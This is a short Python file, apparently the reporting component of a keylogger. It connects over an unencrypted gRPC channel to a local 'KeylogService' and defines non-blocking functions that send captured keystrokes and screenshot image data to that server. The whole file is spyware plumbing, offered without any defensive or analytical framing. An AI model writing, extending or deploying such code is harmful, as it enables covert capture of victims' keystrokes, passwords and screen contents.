import grpc
import protos.server_pb2 as keylog_pb2
import protos.server_pb2_grpc as keylog_pb2_grpc

# CONNECT TO SERVER
channel = grpc.insecure_channel("127.0.0.1:50051")
stub = keylog_pb2_grpc.KeylogServiceStub(channel)

def send_key_non_blocking(text):
    """
    Send keylog to the server WITHOUT WAITING for response.
    """
    # Fire-and-forget RPC call
    stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=text))

def send_screenshot_non_blocking(filename, image_data):
    """
    Send screenshot to the server WITHOUT WAITING for response.
    
    Args:
        filename: Name of the screenshot file (e.g., "screenshot_20260206_123456.png")
        image_data: Binary image data (bytes)
    
    Example usage:
        with open("screenshot.png", "rb") as f:
            image_data = f.read()
        send_screenshot_non_blocking("screenshot.png", image_data)
    """
    # Fire-and-forget RPC call
    stub.SendScreenshot.future(
        keylog_pb2.ScreenshotRequest(
            filename=filename,
            image_data=image_data
        )
    )